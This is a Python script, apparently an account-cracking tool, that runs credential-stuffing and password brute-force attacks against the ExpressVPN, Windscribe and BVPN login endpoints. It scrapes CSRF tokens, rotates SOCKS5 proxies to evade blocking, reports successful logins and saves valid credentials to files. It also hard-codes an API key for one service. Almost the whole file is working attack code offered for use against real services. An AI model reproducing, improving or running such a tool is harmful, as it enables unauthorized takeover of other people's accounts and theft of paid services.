import requests
from bs4 import BeautifulSoup 
import json
from random import choice
from os import system as sys
from RandomBanner import RandomBanner
import threading

banner = RandomBanner()
random_result = banner.random_banner()

rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn, k,g = '\033[00;36m', '\033[90m','\033[38;5;130m'

def Clear():
	if 'Windows' in __import__("platform").uname():
		sys("cls")
	else:
		sys("clear")

s = requests.Session()

def windscribe(target,paslist,fi=None):
        
        with open(paslist,'r') as pc:
            for line in pc:
                socks5 = choice(fi)
                source = s.post('https://res.windscribe.com/res/logintoken').json()                
                token = source['csrf_token']
                time = source['csrf_time']
                line = line.strip().split(':')
                if len(line) == 2:
                    user,pas = line
                    payload = {
                        'login': 1,
						'upgrade': 0,
						'csrf_time': time,
						'csrf_token': token,
						'username': user,
						'password': pas,
						'code':'' 

                  
                    }
                    result = s.post('https://windscribe.com/login'
,data=payload,proxies={'socks5://':socks5})
                    if 'Please login with your username, not your email address.' in result.text:
                        print (f"{lrd}[{yw}-{lrd}] {rd}Is wrong{yw} = {lrd}{user}:{pas}")
                    else:
                        print (f"{lrd}[{lgn}+{lrd}] {gn}SUCCESS {yw}={lgn} {user}:{pas}")
                        with open('valid-Wind.txt','a') as d:
                        	d.write(f'{user}:{pas}')
                        

                else:
                    payload = {
                        'login': 1,
						'upgrade': 0,
						'csrf_time': time,
						'csrf_token': token,
						'username': target,
						'password': line,
						'code':'' 
              
                    }            
                    result = requests.post('https://windscribe.com/login',data=payload,proxies={'socks5://':socks5})   
                    if 'Please login with your username, not your email address.' in result.text:
                        print (f"{lrd}[{yw}-{lrd}] {rd}Is wrong{yw} = {lrd}{target}:{line}")
                    else:
                        print (f"{lrd}[{lgn}+{lrd}] {gn}SUCCESS {yw}= {target}:{line}")
                        exit()

def Express(target,paslist,fi=None):
        
        with open(paslist,'r') as pc:
            for line in pc:
                socks5 = choice(fi)
                source = s.get('https://www.expressvpn.com/sign-in')
                soup = BeautifulSoup(source.text,'html.parser')
                csrf = soup.find('input',{'name':'xkgztqpe'})['value']
                hidden_tags = soup.find_all('input', {'type': 'hidden'})
                name = hidden_tags[3]
                name = name['name']
                line = line.strip().split(':')
                if len(line) == 2:
                    user,pas = line
                    payload = {
                        'utf8': '✓',
                        'xkgztqpe': csrf,
                        'location_fragment': '',
                        name: '',
                        'redirect_path': '',
                        'email': user,
                        'password': pas,
                        'commit': 'Sign In'                        
                    }
                    result = s.post('https://www.expressvpn.com/sessions',data=payload,proxies={'socks5://':socks5})
                    if 'Invalid email or password.' in result.text:
                        print (f"{lrd}[{yw}-{lrd}] {rd}Is wrong{yw} = {lrd}{user}:{pas}")
                    else:
                        print (f"{lrd}[{lgn}+{lrd}] {gn}SUCCESS {yw}={lgn} {user}:{pas}")                        

                else:
                    payload = {
                        'utf8': '✓',
                        'xkgztqpe': csrf,
                        'location_fragment': '',
                        name: '',
                        'redirect_path': '',
                        'email': target,
                        'password': line,
                        'commit': 'Sign In'                        
                    }            
                    result = requests.post('https://www.expressvpn.com/sessions',data=payload,proxies={'socks5://':socks5})   
                    if 'Invalid email or password.' in result.text:
                        print (f"{lrd}[{yw}-{lrd}] {rd}Is wrong{yw} = {lrd}{target}:{line}")
                    else:
                        print (f"{lrd}[{lgn}+{lrd}] {gn}SUCCESS {yw}= {target}:{line}")
                        exit()

def Bvpn(target,paslist,fi=None):
    h = {'x-api-key': 'RUEJXnAVGP98jdPSrqlY52Tsk6o98ZPs9ebohQih'}
    with open(paslist,'r') as pc:
    	for line in pc:
    		socks5 = choice(fi)
    		line = line.strip().split(':')
    		if len(line) == 2:
    			user,pas = line
    			ur = f'https://tojgjtiocd.execute-api.eu-west-1.amazonaws.com:443/bVPN-Secure_Production/api/login/?password={pas}&username={user}'
    			r = requests.get(ur,headers=h).text
    			if 'Your account has been disabled' in r:
    				print (f"{lrd}[{lgn}+{lrd}] {gn}SUCCESS {yw}={lgn} {user}:{pas}")
    				with open('valid-Bvpn.txt','a') as d:
    					d.write(f'{user}:{pas}')
    			elif 'Your username and password were incorrect.' in r:
    				print (f"{lrd}[{yw}-{lrd}] {rd}Is wrong{yw} = {lrd}{user}:{pas}")
    			elif 'Forbidden' in r:
    				print (f"{lrd}Error")
    			else:
    				print (f"{lrd}[{lgn}+{lrd}] {gn}SUCCESS {yw}={lgn} {user}:{pas}")
    		else:
    			ur = f'https://tojgjtiocd.execute-api.eu-west-1.amazonaws.com:443/bVPN-Secure_Production/api/login/?password={line}&username={target}'
    			r = requests.get(ur,headers=h).text
    			if 'Your account has been disabled' in r:
    				print (f"{lrd}[{lgn}+{lrd}] {gn}SUCCESS {yw}={lgn} {target}:{line}")
    				
    			elif 'Your username and password were incorrect.' in r:
    				print (f"{lrd}[{yw}-{lrd}] {rd}Is wrong{yw} = {lrd}{target}:{line}")
    			elif 'Forbidden' in r:
    				print (f"{lrd}Error")
    			else:
    				print (f"{lrd}[{lgn}+{lrd}] {gn}SUCCESS {yw}={lgn} {target}:{line}")			
Clear()   			
    			
    		
print (random_result)
number = input(f"{lrd}[{cn}1{lrd}] {gn}Cracker Account Express Vpn\n\n{lrd}[{cn}2{lrd}] {gn}Cracker Account Windscribe\n\n{lrd}[{cn}3{lrd}] {gn}Cracker Account BVPN\n\n     {lrd}[{pe}~{lrd}] {gn}Select : {cn}")

if number == "1":
    Clear()
    target = input(f"""{cn}
                                                        
  wWw    wW    Ww   ))     ()_()    wWw     oo_      oo_    
  (O)_  (O)\  /(O) (o0)-.  (O o)    (O)_   /  _)-<  /  _)-< 
  / __)  `. \/ .'   | (_))  |^_\    / __)  \__ `.   \__ `.  
 / (       \  /     | .-'   |(_))  / (        `. |     `. | 
(  _)      /  \     |(      |  /  (  _)       _| |     _| | 
 \ \_    .' /\ `.    \)     )|\\   \ \_    ,-'   |  ,-'   | 
  \__)  (_.'  `._)   (     (/  \)   \__)  (_..--'  (_..--'  

\n{yw}Git & Tg : @esfelurm\n\n{lrd}[{pe}~{lrd}] {gn}Target : {cn}""")
    o = input(f"{lrd}[{pe}~{lrd}] {gn}Address PasswordList/ComboList : {cn}")
    p = input(f"{lrd}[{pe}~{lrd}] {gn}Address File Proxy Socks5 : {cn}")
    with open(p,'r') as fi:
    	fi = fi.readlines()
    Express(target=target,paslist=o,fi=fi)
    
    
if number == "2":
    Clear()
    target = input(f"""{cn}
           _          .-.                  _ .-.         
         :_;         : :                 :_;: :         
.-..-..-..-.,-.,-. .-' : .--.  .--. .--. .-.: `-.  .--. 
: `; `; :: :: ,. :' .; :`._-.''  ..': ..': :' .; :' '_.'
`.__.__.':_;:_;:_;`.__.'`.__.'`.__.':_;  :_;`.__.'`.__.'
                                                        
                                                        
\n{yw}Git & Tg : @esfelurm\n\n{lrd}[{pe}~{lrd}] {gn}Target : {cn}""")
    o = input(f"{lrd}[{pe}~{lrd}] {gn}Address PasswordList/ComboList : {cn}")
    p = input(f"{lrd}[{pe}~{lrd}] {gn}Address File Proxy Socks5 : {cn}")
    with open(p,'r') as fi:
    	fi = fi.readlines()
    thread = threading.Thread(target=windscribe(target=target,paslist=o,fi=fi))
    thread.start()

if number == "3":
    Clear()
    target = input(f"""{cn}
______          _   _ ______  _   _ 
| ___ \        | | | || ___ \| \ | |
| |_/ / ______ | | | || |_/ /|  \| |
| ___ \|______|| | | ||  __/ | . ` |
| |_/ /        \ \_/ /| |    | |\  |
\____/          \___/ \_|    \_| \_/
                                                                       

\n{yw}Git & Tg : @esfelurm\n\n{lrd}[{pe}~{lrd}] {gn}Target : {cn}""")
    o = input(f"{lrd}[{pe}~{lrd}] {gn}Address PasswordList/ComboList : {cn}")
    p = input(f"{lrd}[{pe}~{lrd}] {gn}Address File Proxy Socks5 : {cn}")
    with open(p,'r') as fi:
    	fi = fi.readlines()
    thread = threading.Thread(target=Bvpn(target=target,paslist=o,fi=fi))
    thread.start()
